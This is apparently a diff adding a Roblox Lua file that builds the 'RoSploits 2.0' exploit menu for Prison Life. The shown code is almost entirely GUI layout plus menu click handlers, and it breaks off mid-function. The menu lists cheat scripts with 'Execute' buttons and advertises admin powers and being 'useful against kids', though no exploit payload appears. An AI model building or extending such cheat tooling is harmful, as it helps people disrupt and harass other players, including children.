@@ -1,0 +1,874 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local RoSploits20 = Instance.new("ScreenGui")
+local thewholegui = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local close = Instance.new("ImageButton")
+local menu = Instance.new("ImageButton")
+local volume_off = Instance.new("ImageButton")
+local volume_up = Instance.new("ImageButton")
+local SettingsF = Instance.new("Frame")
+local Scripts = Instance.new("TextButton")
+local Scripts_2 = Instance.new("TextButton")
+local TextBox = Instance.new("TextBox")
+local Scripts_3 = Instance.new("TextButton")
+local Frame = Instance.new("Frame")
+local Menu = Instance.new("Frame")
+local Credits = Instance.new("TextButton")
+local people = Instance.new("ImageButton")
+local Settings = Instance.new("TextButton")
+local settings = Instance.new("ImageButton")
+local Shadow = Instance.new("Frame")
+local Scripts_4 = Instance.new("TextButton")
+local library_books = Instance.new("ImageButton")
+local Game = Instance.new("Frame")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local PrevailX = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local Scripts_5 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local Septex = Instance.new("Frame")
+local Frame_3 = Instance.new("Frame")
+local Scripts_6 = Instance.new("TextButton")
+local TextLabel_4 = Instance.new("TextLabel")
+local ImageLabel_2 = Instance.new("ImageLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local PrisonBreaker = Instance.new("Frame")
+local Frame_4 = Instance.new("Frame")
+local Execute = Instance.new("TextButton")
+local TextLabel_6 = Instance.new("TextLabel")
+local uniqueimage = Instance.new("ImageLabel")
+local TextLabel_7 = Instance.new("TextLabel")
+local CS = Instance.new("Frame")
+local Frame_5 = Instance.new("Frame")
+local TextLabel_8 = Instance.new("TextLabel")
+local uniqueimage_2 = Instance.new("ImageLabel")
+local TextLabel_9 = Instance.new("TextLabel")
+local Scripts_7 = Instance.new("TextButton")
+local content_copy = Instance.new("ImageButton")
+local Credits_2 = Instance.new("Frame")
+local ImageLabel_3 = Instance.new("ImageLabel")
+local TextLabel_10 = Instance.new("TextLabel")
+local TextLabel_11 = Instance.new("TextLabel")
+local Frame_6 = Instance.new("Frame")
+local TextLabel_12 = Instance.new("TextLabel")
+local Frame_7 = Instance.new("Frame")
+local Scripts_8 = Instance.new("TextButton")
+local content_copy_2 = Instance.new("ImageButton")
+
+--Properties:
+
+RoSploits20.Name = "RoSploits 2.0"
+RoSploits20.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+RoSploits20.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+thewholegui.Name = "the whole gui"
+thewholegui.Parent = RoSploits20
+thewholegui.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+thewholegui.ClipsDescendants = true
+thewholegui.Position = UDim2.new(0.136034444, 0, 0.273335367, 0)
+thewholegui.Size = UDim2.new(0, 446, 0, 241)
+
+UICorner.CornerRadius = UDim.new(0, 3)
+UICorner.Parent = thewholegui
+
+TextLabel.Parent = thewholegui
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 0.900
+TextLabel.Size = UDim2.new(0, 446, 0, 33)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "RoSploits 2.0 - Prison Life"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 25.000
+TextLabel.TextWrapped = true
+
+close.Name = "close"
+close.Parent = TextLabel
+close.BackgroundTransparency = 1.000
+close.LayoutOrder = 5
+close.Position = UDim2.new(0.926008999, 0, 0.121212125, 0)
+close.Size = UDim2.new(0, 25, 0, 25)
+close.ZIndex = 2
+close.Image = "rbxassetid://3926305904"
+close.ImageRectOffset = Vector2.new(284, 4)
+close.ImageRectSize = Vector2.new(24, 24)
+
+menu.Name = "menu"
+menu.Parent = TextLabel
+menu.BackgroundTransparency = 1.000
+menu.LayoutOrder = 4
+menu.Position = UDim2.new(0.0134529145, 0, 0.0909090936, 0)
+menu.Size = UDim2.new(0, 27, 0, 27)
+menu.ZIndex = 2
+menu.Image = "rbxassetid://3926305904"
+menu.ImageRectOffset = Vector2.new(604, 684)
+menu.ImageRectSize = Vector2.new(36, 36)
+
+volume_off.Name = "volume_off"
+volume_off.Parent = TextLabel
+volume_off.BackgroundTransparency = 1.000
+volume_off.LayoutOrder = 11
+volume_off.Position = UDim2.new(0.869955182, 0, 0.121212125, 0)
+volume_off.Size = UDim2.new(0, 25, 0, 25)
+volume_off.Visible = false
+volume_off.ZIndex = 2
+volume_off.Image = "rbxassetid://3926307971"
+volume_off.ImageRectOffset = Vector2.new(4, 404)
+volume_off.ImageRectSize = Vector2.new(36, 36)
+
+volume_up.Name = "volume_up"
+volume_up.Parent = TextLabel
+volume_up.BackgroundTransparency = 1.000
+volume_up.LayoutOrder = 3
+volume_up.Position = UDim2.new(0.870000005, 0, 0.120999999, 0)
+volume_up.Size = UDim2.new(0, 25, 0, 25)
+volume_up.ZIndex = 2
+volume_up.Image = "rbxassetid://3926307971"
+volume_up.ImageRectOffset = Vector2.new(684, 324)
+volume_up.ImageRectSize = Vector2.new(36, 36)
+
+SettingsF.Name = "SettingsF"
+SettingsF.Parent = thewholegui
+SettingsF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SettingsF.BackgroundTransparency = 1.000
+SettingsF.Position = UDim2.new(0, 0, 0.136929467, 0)
+SettingsF.Size = UDim2.new(0, 446, 0, 208)
+
+Scripts.Name = "Scripts"
+Scripts.Parent = SettingsF
+Scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts.BackgroundTransparency = 0.900
+Scripts.BorderSizePixel = 0
+Scripts.Position = UDim2.new(0.0508419089, 0, 0.093720071, 0)
+Scripts.Size = UDim2.new(0, 168, 0, 31)
+Scripts.Font = Enum.Font.SourceSansBold
+Scripts.Text = "Enable Universal"
+Scripts.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts.TextSize = 23.000
+
+Scripts_2.Name = "Scripts"
+Scripts_2.Parent = SettingsF
+Scripts_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_2.BackgroundTransparency = 0.900
+Scripts_2.BorderSizePixel = 0
+Scripts_2.Position = UDim2.new(0.0508419126, 0, 0.343720108, 0)
+Scripts_2.Size = UDim2.new(0, 168, 0, 31)
+Scripts_2.Font = Enum.Font.SourceSansBold
+Scripts_2.Text = "Transparency"
+Scripts_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_2.TextSize = 23.000
+
+TextBox.Parent = SettingsF
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundTransparency = 0.900
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(0.0313901342, 0, 0.807692289, 0)
+TextBox.Size = UDim2.new(0, 168, 0, 29)
+TextBox.Font = Enum.Font.SourceSansBold
+TextBox.Text = "wdym"
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 17.000
+
+Scripts_3.Name = "Scripts"
+Scripts_3.Parent = TextBox
+Scripts_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_3.BackgroundTransparency = 0.900
+Scripts_3.BorderSizePixel = 0
+Scripts_3.Position = UDim2.new(1.07465148, 0, 0.136823952, 0)
+Scripts_3.Size = UDim2.new(0, 120, 0, 20)
+Scripts_3.Font = Enum.Font.SourceSansBold
+Scripts_3.Text = "Suggest"
+Scripts_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_3.TextSize = 23.000
+
+Frame.Parent = SettingsF
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BackgroundTransparency = 0.900
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0, 0, 0.75, 0)
+Frame.Size = UDim2.new(0, 445, 0, 4)
+
+Menu.Name = "Menu"
+Menu.Parent = thewholegui
+Menu.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Menu.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Menu.BorderSizePixel = 0
+Menu.Position = UDim2.new(-0.342807174, 1, 0.132850617, 0)
+Menu.Selectable = true
+Menu.Size = UDim2.new(0, 151, 0, 208)
+Menu.Visible = false
+Menu.ZIndex = 3
+
+Credits.Name = "Credits"
+Credits.Parent = Menu
+Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Credits.BackgroundTransparency = 0.900
+Credits.BorderSizePixel = 0
+Credits.Position = UDim2.new(0.0469999984, 0, 0.209999993, 1)
+Credits.Size = UDim2.new(0, 136, 0, 31)
+Credits.ZIndex = 4
+Credits.Font = Enum.Font.SourceSansBold
+Credits.Text = "Credits"
+Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+Credits.TextSize = 23.000
+
+people.Name = "people"
+people.Parent = Credits
+people.BackgroundTransparency = 1.000
+people.LayoutOrder = 4
+people.Position = UDim2.new(0, 4, 0, 3)
+people.Size = UDim2.new(0, 25, 0, 25)
+people.ZIndex = 2
+people.Image = "rbxassetid://3926305904"
+people.ImageRectOffset = Vector2.new(144, 4)
+people.ImageRectSize = Vector2.new(24, 24)
+
+Settings.Name = "Settings"
+Settings.Parent = Menu
+Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Settings.BackgroundTransparency = 0.900
+Settings.BorderSizePixel = 0
+Settings.Position = UDim2.new(0.0469999984, 0, 0.379999995, 1)
+Settings.Size = UDim2.new(0, 136, 0, 31)
+Settings.ZIndex = 4
+Settings.Font = Enum.Font.SourceSansBold
+Settings.Text = "         Settings"
+Settings.TextColor3 = Color3.fromRGB(255, 255, 255)
+Settings.TextSize = 23.000
+Settings.TextXAlignment = Enum.TextXAlignment.Left
+
+settings.Name = "settings"
+settings.Parent = Settings
+settings.BackgroundTransparency = 1.000
+settings.Position = UDim2.new(0, 4, 0, 3)
+settings.Size = UDim2.new(0, 25, 0, 25)
+settings.ZIndex = 2
+settings.Image = "rbxassetid://3926307971"
+settings.ImageRectOffset = Vector2.new(324, 124)
+settings.ImageRectSize = Vector2.new(36, 36)
+
+Shadow.Name = "Shadow"
+Shadow.Parent = Menu
+Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Shadow.BackgroundTransparency = 0.750
+Shadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Shadow.BorderSizePixel = 0
+Shadow.Position = UDim2.new(0.99419421, 0, 0, 0)
+Shadow.Size = UDim2.new(0, 447, 0, 208)
+Shadow.Visible = false
+
+Scripts_4.Name = "Scripts"
+Scripts_4.Parent = Menu
+Scripts_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_4.BackgroundTransparency = 0.900
+Scripts_4.BorderSizePixel = 0
+Scripts_4.Position = UDim2.new(0.0460000001, 0, 0.0450000018, 0)
+Scripts_4.Size = UDim2.new(0, 136, 0, 32)
+Scripts_4.ZIndex = 4
+Scripts_4.Font = Enum.Font.SourceSansBold
+Scripts_4.Text = "Scripts"
+Scripts_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_4.TextSize = 23.000
+
+library_books.Name = "library_books"
+library_books.Parent = Scripts_4
+library_books.BackgroundTransparency = 1.000
+library_books.LayoutOrder = 11
+library_books.Position = UDim2.new(0, 4, 0, 3)
+library_books.Size = UDim2.new(0, 25, 0, 25)
+library_books.ZIndex = 2
+library_books.Image = "rbxassetid://3926305904"
+library_books.ImageRectOffset = Vector2.new(404, 124)
+library_books.ImageRectSize = Vector2.new(36, 36)
+
+Game.Name = "Game"
+Game.Parent = thewholegui
+Game.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Game.BackgroundTransparency = 1.000
+Game.Position = UDim2.new(0, 0, 0.136929467, 0)
+Game.Size = UDim2.new(0, 446, 0, 208)
+Game.Visible = false
+
+ScrollingFrame.Parent = Game
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.BorderColor3 = Color3.fromRGB(122, 0, 2)
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.Size = UDim2.new(0, 446, 0, 208)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 3, 0)
+ScrollingFrame.ScrollBarThickness = 7
+
+PrevailX.Name = "Prevail X"
+PrevailX.Parent = ScrollingFrame
+PrevailX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PrevailX.BackgroundTransparency = 1.000
+PrevailX.Size = UDim2.new(0, 446, 0, 156)
+
+Frame_2.Parent = PrevailX
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.BackgroundTransparency = 0.900
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0, 0, 0.976762772, 0)
+Frame_2.Size = UDim2.new(0, 456, 0, 3)
+
+Scripts_5.Name = "Scripts"
+Scripts_5.Parent = PrevailX
+Scripts_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_5.BackgroundTransparency = 0.900
+Scripts_5.BorderSizePixel = 0
+Scripts_5.Position = UDim2.new(0.466524661, 0, 0.632307708, 0)
+Scripts_5.Size = UDim2.new(0, 203, 0, 35)
+Scripts_5.Font = Enum.Font.SourceSansBold
+Scripts_5.Text = "Execute"
+Scripts_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_5.TextSize = 23.000
+Scripts_5.TextWrapped = true
+
+TextLabel_2.Parent = PrevailX
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.023, 0, 0.0250000004, 0)
+TextLabel_2.Size = UDim2.new(0, 180, 0, 26)
+TextLabel_2.Font = Enum.Font.SourceSansBold
+TextLabel_2.Text = "Prevail X"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 22.000
+TextLabel_2.TextWrapped = true
+
+ImageLabel.Parent = PrevailX
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(0.0291479863, 0, 0.22195515, 0)
+ImageLabel.Size = UDim2.new(0, 180, 0, 96)
+ImageLabel.Image = "rbxassetid://8950355191"
+ImageLabel.ScaleType = Enum.ScaleType.Fit
+
+TextLabel_3.Parent = PrevailX
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.450672626, 0, 0.177145049, 0)
+TextLabel_3.Size = UDim2.new(0, 223, 0, 56)
+TextLabel_3.Font = Enum.Font.SourceSansBold
+TextLabel_3.Text = "A script with a lot of features! useful against kids"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 22.000
+TextLabel_3.TextWrapped = true
+
+Septex.Name = "Septex"
+Septex.Parent = ScrollingFrame
+Septex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Septex.BackgroundTransparency = 1.000
+Septex.Position = UDim2.new(0, 0, 0.243000001, 0)
+Septex.Size = UDim2.new(0, 446, 0, 156)
+
+Frame_3.Parent = Septex
+Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_3.BackgroundTransparency = 0.900
+Frame_3.BorderSizePixel = 0
+Frame_3.Position = UDim2.new(0, 0, 0.976762772, 0)
+Frame_3.Size = UDim2.new(0, 456, 0, 3)
+
+Scripts_6.Name = "Scripts"
+Scripts_6.Parent = Septex
+Scripts_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_6.BackgroundTransparency = 0.900
+Scripts_6.BorderSizePixel = 0
+Scripts_6.Position = UDim2.new(0.466524631, 0, 0.606666684, 0)
+Scripts_6.Size = UDim2.new(0, 203, 0, 35)
+Scripts_6.Font = Enum.Font.SourceSansBold
+Scripts_6.Text = "Execute"
+Scripts_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_6.TextSize = 23.000
+Scripts_6.TextWrapped = true
+
+TextLabel_4.Parent = Septex
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0.0270627812, 0, 0.0553846061, 0)
+TextLabel_4.Size = UDim2.new(0, 180, 0, 26)
+TextLabel_4.Font = Enum.Font.SourceSansBold
+TextLabel_4.Text = "Septex Admin"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 22.000
+TextLabel_4.TextWrapped = true
+
+ImageLabel_2.Parent = Septex
+ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_2.BackgroundTransparency = 1.000
+ImageLabel_2.Position = UDim2.new(0.0180941857, 0, 0.273237169, 0)
+ImageLabel_2.Size = UDim2.new(0, 184, 0, 100)
+ImageLabel_2.Image = "rbxassetid://8950479061"
+ImageLabel_2.ScaleType = Enum.ScaleType.Fit
+
+TextLabel_5.Parent = Septex
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.Position = UDim2.new(0.448430508, 0, 0.177179486, 0)
+TextLabel_5.Size = UDim2.new(0, 227, 0, 56)
+TextLabel_5.Font = Enum.Font.SourceSansBold
+TextLabel_5.Text = "All-in-one script. Admin people, give people key and more!"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 22.000
+TextLabel_5.TextWrapped = true
+
+PrisonBreaker.Name = "PrisonBreaker"
+PrisonBreaker.Parent = ScrollingFrame
+PrisonBreaker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PrisonBreaker.BackgroundTransparency = 1.000
+PrisonBreaker.Position = UDim2.new(0, 0, 0.488999993, 0)
+PrisonBreaker.Size = UDim2.new(0, 446, 0, 156)
+
+Frame_4.Parent = PrisonBreaker
+Frame_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_4.BackgroundTransparency = 0.900
+Frame_4.BorderSizePixel = 0
+Frame_4.Position = UDim2.new(0, 0, 0.976762772, 0)
+Frame_4.Size = UDim2.new(0, 456, 0, 3)
+
+Execute.Name = "Execute"
+Execute.Parent = PrisonBreaker
+Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Execute.BackgroundTransparency = 0.900
+Execute.BorderSizePixel = 0
+Execute.Position = UDim2.new(0.466524631, 0, 0.619487166, 0)
+Execute.Size = UDim2.new(0, 203, 0, 35)
+Execute.Font = Enum.Font.SourceSansBold
+Execute.Text = "Execute"
+Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
+Execute.TextSize = 23.000
+Execute.TextWrapped = true
+
+TextLabel_6.Parent = PrisonBreaker
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.Position = UDim2.new(0.000156968832, 0, -0.146563992, 0)
+TextLabel_6.Size = UDim2.new(0, 200, 0, 64)
+TextLabel_6.Font = Enum.Font.SourceSansBold
+TextLabel_6.Text = "\\nPrisonbreaker V1.4"
+TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.TextSize = 24.000
+TextLabel_6.TextWrapped = true
+
+uniqueimage.Name = "unique image"
+uniqueimage.Parent = PrisonBreaker
+uniqueimage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+uniqueimage.BackgroundTransparency = 1.000
+uniqueimage.Position = UDim2.new(0.0180941876, 0, 0.273237169, 0)
+uniqueimage.Size = UDim2.new(0, 182, 0, 100)
+uniqueimage.Image = "rbxassetid://8955172707"
+uniqueimage.ScaleType = Enum.ScaleType.Fit
+
+TextLabel_7.Parent = PrisonBreaker
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BackgroundTransparency = 1.000
+TextLabel_7.Position = UDim2.new(0.448430508, 0, 0.177179486, 0)
+TextLabel_7.Size = UDim2.new(0, 227, 0, 56)
+TextLabel_7.Font = Enum.Font.SourceSansBold
+TextLabel_7.Text = "Fe commands, fe bring. A classic gui used by a lot of people"
+TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.TextScaled = true
+TextLabel_7.TextSize = 22.000
+TextLabel_7.TextWrapped = true
+
+CS.Name = "CS"
+CS.Parent = ScrollingFrame
+CS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CS.BackgroundTransparency = 1.000
+CS.Position = UDim2.new(0, 0, 0.735000014, 0)
+CS.Size = UDim2.new(0, 446, 0, 156)
+
+Frame_5.Parent = CS
+Frame_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_5.BackgroundTransparency = 0.900
+Frame_5.BorderSizePixel = 0
+Frame_5.Position = UDim2.new(0, 0, 0.976762772, 0)
+Frame_5.Size = UDim2.new(0, 456, 0, 3)
+
+TextLabel_8.Parent = CS
+TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.BackgroundTransparency = 1.000
+TextLabel_8.Position = UDim2.new(0.000156966969, 0, 0.0393334404, 0)
+TextLabel_8.Size = UDim2.new(0, 200, 0, 36)
+TextLabel_8.Font = Enum.Font.SourceSansBold
+TextLabel_8.Text = "More coming soon!"
+TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.TextSize = 24.000
+TextLabel_8.TextWrapped = true
+
+uniqueimage_2.Name = "unique image"
+uniqueimage_2.Parent = CS
+uniqueimage_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+uniqueimage_2.BackgroundTransparency = 1.000
+uniqueimage_2.Position = UDim2.new(0.116748892, 0, 0.27010268, 0)
+uniqueimage_2.Size = UDim2.new(0, 100, 0, 100)
+uniqueimage_2.Image = "rbxassetid://8955207709"
+uniqueimage_2.ScaleType = Enum.ScaleType.Fit
+
+TextLabel_9.Parent = CS
+TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_9.BackgroundTransparency = 1.000
+TextLabel_9.Position = UDim2.new(0.434977561, 0, 0.177179575, 0)
+TextLabel_9.Size = UDim2.new(0, 238, 0, 68)
+TextLabel_9.Font = Enum.Font.SourceSansBold
+TextLabel_9.Text = "If you want a script to be added, suggest one in our discord!"
+TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_9.TextScaled = true
+TextLabel_9.TextSize = 22.000
+TextLabel_9.TextWrapped = true
+
+Scripts_7.Name = "Scripts"
+Scripts_7.Parent = CS
+Scripts_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_7.BackgroundTransparency = 0.900
+Scripts_7.BorderSizePixel = 0
+Scripts_7.Position = UDim2.new(0.492545933, 0, 0.672245741, 0)
+Scripts_7.Size = UDim2.new(0, 184, 0, 31)
+Scripts_7.Font = Enum.Font.SourceSansBold
+Scripts_7.Text = "         Copy discord link"
+Scripts_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_7.TextSize = 23.000
+Scripts_7.TextWrapped = true
+Scripts_7.TextXAlignment = Enum.TextXAlignment.Left
+
+content_copy.Name = "content_copy"
+content_copy.Parent = Scripts_7
+content_copy.BackgroundTransparency = 1.000
+content_copy.LayoutOrder = 12
+content_copy.Position = UDim2.new(0.0309999995, 0, 0.0649999976, 0)
+content_copy.Size = UDim2.new(0, 25, 0, 25)
+content_copy.ZIndex = 2
+content_copy.Image = "rbxassetid://3926305904"
+content_copy.ImageRectOffset = Vector2.new(924, 764)
+content_copy.ImageRectSize = Vector2.new(36, 36)
+
+Credits_2.Name = "Credits"
+Credits_2.Parent = thewholegui
+Credits_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Credits_2.BackgroundTransparency = 1.000
+Credits_2.Position = UDim2.new(0, 0, 0.136929467, 0)
+Credits_2.Size = UDim2.new(0, 446, 0, 208)
+Credits_2.Visible = false
+
+ImageLabel_3.Parent = Credits_2
+ImageLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_3.BorderSizePixel = 0
+ImageLabel_3.Position = UDim2.new(0.0489999987, 0, 0.0549999997, 0)
+ImageLabel_3.Size = UDim2.new(0, 100, 0, 100)
+ImageLabel_3.Image = "rbxassetid://8950030410"
+
+TextLabel_10.Parent = Credits_2
+TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_10.BackgroundTransparency = 1.000
+TextLabel_10.Position = UDim2.new(0.328868777, 0, 0.0913461596, 0)
+TextLabel_10.Size = UDim2.new(0, 274, 0, 47)
+TextLabel_10.Font = Enum.Font.SourceSansBold
+TextLabel_10.Text = "Where RoSploits has been created and is being developed"
+TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_10.TextScaled = true
+TextLabel_10.TextSize = 22.000
+TextLabel_10.TextWrapped = true
+
+TextLabel_11.Parent = Credits_2
+TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_11.BackgroundTransparency = 1.000
+TextLabel_11.Position = UDim2.new(0.0351468064, 0, 0.644230723, 0)
+TextLabel_11.Size = UDim2.new(0, 228, 0, 67)
+TextLabel_11.Font = Enum.Font.SourceSansBold
+TextLabel_11.Text = "shitass#6733 - Gui  cursedv2#3199 - Scripter"
+TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_11.TextSize = 24.000
+TextLabel_11.TextWrapped = true
+TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left
+
+Frame_6.Parent = Credits_2
+Frame_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_6.BackgroundTransparency = 0.900
+Frame_6.BorderSizePixel = 0
+Frame_6.Position = UDim2.new(0.546357572, 0, 0.605769217, 0)
+Frame_6.Size = UDim2.new(0, 3, 0, 82)
+
+TextLabel_12.Parent = Frame_6
+TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_12.BackgroundTransparency = 1.000
+TextLabel_12.Position = UDim2.new(3.36847949, 0, 0.0832549334, 0)
+TextLabel_12.Size = UDim2.new(0, 184, 0, 67)
+TextLabel_12.Font = Enum.Font.SourceSansBold
+TextLabel_12.Text = "a aero x developer guy"
+TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_12.TextSize = 24.000
+TextLabel_12.TextWrapped = true
+TextLabel_12.TextXAlignment = Enum.TextXAlignment.Left
+
+Frame_7.Parent = Credits_2
+Frame_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_7.BackgroundTransparency = 0.900
+Frame_7.BorderSizePixel = 0
+Frame_7.Position = UDim2.new(0, 0, 0.591346145, 0)
+Frame_7.Size = UDim2.new(0, 446, 0, 3)
+
+Scripts_8.Name = "Scripts"
+Scripts_8.Parent = Credits_2
+Scripts_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_8.BackgroundTransparency = 0.900
+Scripts_8.BorderSizePixel = 0
+Scripts_8.Position = UDim2.new(0.411828429, 0, 0.377373934, 0)
+Scripts_8.Size = UDim2.new(0, 184, 0, 31)
+Scripts_8.Font = Enum.Font.SourceSansBold
+Scripts_8.Text = "         Copy discord link"
+Scripts_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts_8.TextSize = 23.000
+Scripts_8.TextWrapped = true
+Scripts_8.TextXAlignment = Enum.TextXAlignment.Left
+
+content_copy_2.Name = "content_copy"
+content_copy_2.Parent = Scripts_8
+content_copy_2.BackgroundTransparency = 1.000
+content_copy_2.LayoutOrder = 12
+content_copy_2.Position = UDim2.new(0.0309999995, 0, 0.0649999976, 0)
+content_copy_2.Size = UDim2.new(0, 25, 0, 25)
+content_copy_2.ZIndex = 2
+content_copy_2.Image = "rbxassetid://3926305904"
+content_copy_2.ImageRectOffset = Vector2.new(924, 764)
+content_copy_2.ImageRectSize = Vector2.new(36, 36)
+
+-- Scripts:
+
+local function IGCL_fake_script() -- close.LocalScript 
+	local script = Instance.new('LocalScript', close)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.Parent.Parent["amog us"]:Play()
+		script.Parent.Parent.Parent.Visible = false
+		wait(3)
+		script.Parent.Parent.Parent.Parent:Destroy()
+	end)
+	
+end
+coroutine.wrap(IGCL_fake_script)()
+local function EWODNWU_fake_script() -- menu.LocalScript 
+	local script = Instance.new('LocalScript', menu)
+
+	local Debounce = false
+	script.Parent.MouseButton1Click:Connect(function()
+		if Debounce == false then
+			Debounce = true
+		script.Parent.Parent.Parent.Parent.Sound:Play()
+			wait(1)
+			if Debounce == true then
+				Debounce = false
+			script.Parent.Sound.TimePosition = 0
+			end
+			end
+	end)
+	
+end
+coroutine.wrap(EWODNWU_fake_script)()
+local function SZMLZ_fake_script() -- menu.LocalScript 
+	local script = Instance.new('LocalScript', menu)
+
+	local Opened = false
+	local Debounce = false
+	
+	local Menu = script.Parent.Parent.Parent.Menu
+	local TS = game:GetService("TweenService")
+	
+	
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		if Opened == false then
+			if Debounce == false then
+				Debounce = true
+				Opened = true
+				script.Parent.Parent.Parent.Menu.Visible = true
+				Menu.Shadow.Visible = true
